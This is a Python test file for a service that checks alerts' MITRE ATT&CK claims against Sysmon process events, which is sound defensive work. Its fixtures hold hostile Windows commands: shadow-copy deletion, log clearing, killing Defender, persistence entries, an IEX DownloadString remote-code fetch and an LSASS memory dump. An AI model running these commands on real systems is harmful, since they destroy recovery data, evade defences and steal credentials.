import os

os.environ.setdefault("OPENAI_API_KEY", "test-key")

from app.services import attack_assessment_service as svc
from app.services.endpoint_event_service import build_event_report, parse_endpoint_events


def _event(command_line: str, *, image: str = "C:\\Windows\\System32\\cmd.exe") -> str:
    """
    One Sysmon Process Create block.

    The parser needs a header and at least three recognised fields before it will
    treat text as telemetry — a stray "Image:" in prose is not an event — so the
    fixtures carry the field cluster a real event has.
    """
    return (
        "Process Create:\n"
        "UtcTime: 2026-08-07 09:16:30.839\n"
        "ProcessId: 4812\n"
        f"Image: {image}\n"
        f"CommandLine: {command_line}\n"
        "User: EXPERTWARE\\jdoe\n"
        "IntegrityLevel: Medium\n"
        "ParentImage: C:\\Windows\\explorer.exe\n"
    )


def _events(alert_body: str) -> list[dict]:
    return [
        build_event_report(
            event,
            schema_version="1.0",
            started_at="2026-08-07T10:00:00+00:00",
            completed_at="2026-08-07T10:00:01+00:00",
        )
        for event in parse_endpoint_events(alert_body)
    ]


# ── Reading the detection's claim ─────────────────────────────────────────────


def test_the_rules_mapping_is_read_only_from_mitre_context():
    body = (
        "Alert: Ransomware precursor\n"
        "MITRE: T1489, T1552.002, T1547.001\n"
        "Ticket T1234 raised by the analyst\n"       # not a technique
        + _event("vssadmin delete shadows /all")
    )
    assert svc.extract_detection_techniques(body) == ["T1489", "T1552.002", "T1547.001"]


def test_a_t_number_outside_mitre_context_is_not_a_technique():
    body = "Alert: something\nCase T1059 opened at desk T1003\nDetails: nothing\n"
    assert svc.extract_detection_techniques(body) == []


def test_technique_ids_are_normalised():
    assert svc.extract_detection_techniques("mitre technique: t1059.001,") == ["T1059.001"]


# ── Confirming, and declining to ──────────────────────────────────────────────


def test_a_claimed_technique_is_confirmed_by_the_command_that_matched_it():
    body = "MITRE ATT&CK: T1490\n" + _event(
        '"C:\\Windows\\System32\\vssadmin.exe" delete shadows /all /quiet',
        image="C:\\Windows\\System32\\vssadmin.exe",
    )

    result = svc.assess_attack(body, _events(body))

    claim = next(item for item in result["techniques"] if item["id"] == "T1490")
    assert claim["status"] == "confirmed"
    assert claim["confidence"] == "high"
    assert claim["name"] == "Inhibit System Recovery"
    assert claim["tactic"] == "Impact"
    # The confirmation cites the literal text that produced it.
    assert "vssadmin" in claim["evidence"][0]["matched"].lower()
    assert result["confirmed_count"] == 1


def test_a_claim_with_no_bearing_evidence_is_not_corroborated_rather_than_wrong():
    """Absence of evidence is not evidence of absence — the wording matters."""
    body = "MITRE: T1552.002\n" + _event("vssadmin delete shadows /all")

    result = svc.assess_attack(body, _events(body))

    claim = next(item for item in result["techniques"] if item["id"] == "T1552.002")
    assert claim["status"] == "not_corroborated"
    assert claim["evidence"] == []
    assert claim["confidence"] is None
    assert "not a contradiction" in claim["explanation"].lower()


def test_evidence_the_rule_did_not_claim_is_reported_as_additional():
    body = "MITRE: T1552.002\n" + _event("wevtutil cl Security")

    result = svc.assess_attack(body, _events(body))

    additional = {item["id"] for item in result["additional_techniques"]}
    assert "T1070.001" in additional
    found = next(item for item in result["additional_techniques"] if item["id"] == "T1070.001")
    assert found["status"] == "additional"
    assert found["evidence"]


def test_the_example_alerts_three_techniques_are_judged_independently():
    """T1489 confirmed by taskkill, T1547.001 by the Run key, T1552.002 untouched."""
    body = (
        "MITRE: T1489, T1552.002, T1547.001\n"
        + _event("taskkill /F /IM MsMpEng.exe")
        + _event("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d payload.exe")
    )

    result = svc.assess_attack(body, _events(body))
    status = {item["id"]: item["status"] for item in result["techniques"]}

    assert status == {
        "T1489": "confirmed",
        "T1547.001": "confirmed",
        "T1552.002": "not_corroborated",
    }
    assert "confirmed T1489, T1547.001" in result["note"]
    assert "found nothing bearing on T1552.002" in result["note"]


def test_a_parent_technique_is_confirmed_by_evidence_for_its_sub_technique():
    """
    The image is not an interpreter, so nothing evidences bare T1059 directly —
    only the encoded-PowerShell signal, which evidences T1059.001. The claim is
    still corroborated: it is the same behaviour seen at a coarser resolution.
    """
    body = "MITRE: T1059\n" + _event(
        "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMA",
        image="C:\\Program Files\\Vendor\\updater.exe",
    )

    result = svc.assess_attack(body, _events(body))

    claim = next(item for item in result["techniques"] if item["id"] == "T1059")
    assert claim["status"] == "confirmed"
    assert claim["confirmed_via"] == "T1059.001"


def test_an_interpreter_evidences_the_parent_technique_directly():
    body = "MITRE: T1059\n" + _event(
        "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://x/y')",
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    )

    result = svc.assess_attack(body, _events(body))

    claim = next(item for item in result["techniques"] if item["id"] == "T1059")
    assert claim["status"] == "confirmed"
    assert "confirmed_via" not in claim          # evidenced in its own right


def test_an_ambiguous_signal_corroborates_the_sibling_the_rule_named():
    """A persistence signal cannot tell a Run key from a scheduled task."""
    body = "MITRE: T1053.005\n" + _event("schtasks /create /tn Updater /tr payload.exe /sc onlogon")

    result = svc.assess_attack(body, _events(body))
    claim = next(item for item in result["techniques"] if item["id"] == "T1053.005")
    assert claim["status"] == "confirmed"


# ── Refusing to speak ─────────────────────────────────────────────────────────


def test_no_claim_and_no_evidence_produces_no_assessment_at_all():
    """An empty section would imply an assessment that was never made."""
    assert svc.assess_attack("User browsed to evil-corp.net", []) is None


def test_an_alert_with_no_endpoint_evidence_says_so_instead_of_guessing():
    body = "MITRE: T1566.002\nUser clicked https://evil-corp.net/login\n"

    result = svc.assess_attack(body, [])

    assert result["evidence_available"] is False
    assert result["confirmed_count"] == 0
    assert result["techniques"][0]["status"] == "not_corroborated"
    assert "could not be checked either way" in result["note"]


def test_no_technique_is_ever_reported_without_supporting_evidence():
    """The guardrail: everything emitted as confirmed or additional cites a signal."""
    body = "MITRE: T1490, T1003.001, T1552.002\n" + _event(
        "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 624 C:\\temp\\out.dmp full",
        image="C:\\Windows\\System32\\rundll32.exe",
    )

    result = svc.assess_attack(body, _events(body))

    asserted = [
        item
        for item in result["techniques"] + result["additional_techniques"]
        if item["status"] in ("confirmed", "additional")
    ]
    assert asserted, "the LSASS dump should have confirmed something"
    for item in asserted:
        assert item["evidence"], f"{item['id']} was asserted with no evidence"
        assert item["evidence"][0]["signal_id"]


def test_a_technique_the_rule_claimed_that_we_cannot_define_is_still_reported():
    """Hiding it would misrepresent what the detection said."""
    result = svc.assess_attack("MITRE: T9999.123\n", [])

    claim = result["techniques"][0]
    assert claim["id"] == "T9999.123"
    assert claim["known"] is False
    assert claim["status"] == "not_corroborated"
